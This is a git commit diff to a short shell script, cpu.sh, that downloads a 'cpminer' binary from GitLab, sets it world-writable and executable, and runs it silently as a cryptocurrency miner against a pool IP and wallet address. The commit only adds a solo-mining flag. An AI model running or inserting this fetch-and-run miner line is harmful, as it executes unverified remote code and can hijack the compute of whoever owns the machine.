0ae0d73cc270d75ce1f5cfa39656b94a45b0a468
MJVideo <majapahlevi@gmail.com>
2024-04-09 10:20:06 +0000

    Update cpu.sh

--- cpu.sh
+++ cpu.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a minotaurx -o stratum+tcps://138.197.2.25:443 -u RC1wnJN8pQbwNwXnGC7xRW6ozf6GA4buZV -t4 > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a minotaurx -o stratum+tcps://138.197.2.25:443 -u RC1wnJN8pQbwNwXnGC7xRW6ozf6GA4buZV -t4 -p m=solo > /dev/null 2>&1
